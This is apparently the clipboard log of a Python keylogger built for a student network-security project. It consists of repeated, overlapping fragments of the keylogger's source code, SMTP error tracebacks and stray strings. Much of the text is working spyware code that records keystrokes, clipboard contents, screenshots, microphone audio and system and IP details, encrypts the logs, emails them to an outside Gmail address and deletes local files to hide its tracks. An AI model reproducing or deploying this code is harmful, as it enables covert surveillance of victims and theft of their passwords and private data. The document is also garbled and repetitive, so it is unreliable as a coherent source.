Clipboard Data: 
# def copy_clipboard():
#     with open(file_path + extend + clipboard_information, "a") as f:
#         try:
#             win32clipboard.OpenClipboard()
#             pasted_data = win32clipboard.GetClipboardData()
#             win32clipboard.CloseClipboard()

#             f.write("Clipboard Data: \n" + pasted_data)

#         except:
#             f.write("Clipboard could be not be copied")

# copy_clipboard()
Clipboard Data: 
# def microphone():
#     fs = 44100
#     seconds = microphone_time

#     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
#     sd.wait()

#     write(file_path + extend + audio_information, fs, myrecording)
Clipboard Data: 
# def microphone():
#     fs = 44100
#     seconds = microphone_time

#     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
#     sd.wait()

#     write(file_path + extend + audio_information, fs, myrecording)
Clipboard Data: 
#     if currentTime > stoppingTime:

#         with open(file_path + extend + keys_information, "w") as f:
#             f.write(" ")

#         screenshot()
#         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

#         copy_clipboard()

#         number_of_iterations += 1

#         currentTime = time.time()
#         stoppingTime = time.time() + time_iteration
Clipboard Data: 
#     if currentTime > stoppingTime:

#         with open(file_path + extend + keys_information, "w") as f:
#             f.write(" ")

#         screenshot()
#         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

#         copy_clipboard()

#         number_of_iterations += 1

#         currentTime = time.time()
#         stoppingTime = time.time() + time_iteration
Clipboard Data: 
#     if currentTime > stoppingTime:

#         with open(file_path + extend + keys_information, "w") as f:
#             f.write(" ")

#         screenshot()
#         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

#         copy_clipboard()

#         number_of_iterations += 1

#         currentTime = time.time()
#         stoppingTime = time.time() + time_iteration
Clipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
pip install auto-py-to-exeClipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 95, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. s19-20020a170902989300b001aaf2e8b1eesm1871649plp.248 - gsmtp')Clipboard Data: 
hph6CWQRH3Ii6YXi_9M_KNs01vDJOGqhtNX5SxtydiM=Clipboard Data: 
keyloggerClipboard Data: 
keyloggerClipboard Data: 
keyloggerClipboard Data: 
keyloggerClipboard Data: 
keyloggerClipboard Data: 
keyloggerClipboard Data: 
keyloggerClipboard Data: 
keyloggerClipboard Data: 
failed to decode audio: -44: avformat_open_input: No such file or directoryClipboard Data: 
failed to decode audio: -44: avformat_open_input: No such file or directoryClipboard Data: 
e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course>Clipboard Data: 
 fid = open(filename, 'wb')Clipboard Data: 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrabClipboard Data: 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrabClipboard Data: 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrabClipboard Data: 
def record_audio(duration, output_file):
    fs = 44100  # Sample rate
    seconds = duration  # Duration of recording

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()

    sf.write(output_file, recording, fs)

# Example usage: Record audio for 5 seconds and save it to "output.wav"
record_audio(5, "output.wav")Clipboard Data: 
def record_audio(duration, output_file):
    fs = 44100  # Sample rate
    seconds = duration  # Duration of recording

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()

    sf.write(output_file, recording, fs)

# Example usage: Record audio for 5 seconds and save it to "output.wav"
record_audio(5, "output.wav")Clipboard Data: 
def record_audio(duration, output_file):
    fs = 44100  # Sample rate
    seconds = duration  # Duration of recording

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()

    sf.write(output_file, recording, fs)

# Example usage: Record audio for 5 seconds and save it to "output.wav"
record_audio(5, "output.wav")Clipboard Data: 
def record_audio(duration, output_file):
    fs = 44100  # Sample rate
    seconds = duration  # Duration of recording

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()

    sf.write(output_file, recording, fs)

# Example usage: Record audio for 5 seconds and save it to "output.wav"
record_audio(5, "output.wav")Clipboard Data: 
def record_audio(duration, output_file):
    fs = 44100  # Sample rate
    seconds = duration  # Duration of recording

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()

    sf.write(output_file, recording, fs)

# Example usage: Record audio for 5 seconds and save it to "output.wav"
record_audio(5, "output.wav")Clipboard Data: 
import youtube_dlClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 103, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. hi2-20020a17090b30c200b0025023726fc4sm1799301pjb.26 - gsmtp')Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 103, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. x10-20020a170902ec8a00b001a5fccab02dsm3797801plg.177 - gsmtp')
Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 103, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. x10-20020a170902ec8a00b001a5fccab02dsm3797801plg.177 - gsmtp')
Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 103, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. x10-20020a170902ec8a00b001a5fccab02dsm3797801plg.177 - gsmtp')
Clipboard Data: 
Traceback (most recent call last):
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 103, in <module>
    send_email(keys_information, file_path + extend + keys_information, toaddr)
  File "e:\Collage\BTECH-SEMESTER-6\Network Secutity\Project\python-advanced-keylogger-crash-course\keylogger.py", line 99, in send_email
    s.sendmail(fromaddr, toaddr, text)
  File "C:\Users\Sameer\AppData\Local\Programs\Python\Python310\lib\smtplib.py", line 908, in sendmail
    raise SMTPDataError(code, resp)
smtplib.SMTPDataError: (552, b'5.7.0 This message was blocked because its content presents a potential\n5.7.0 security issue. Please visit\n5.7.0  https://support.google.com/mail/?p=BlockedMessage to review our\n5.7.0 message content and attachment content guidelines. x10-20020a170902ec8a00b001a5fccab02dsm3797801plg.177 - gsmtp')
Clipboard Data: 
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)Clipboard Data: 
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
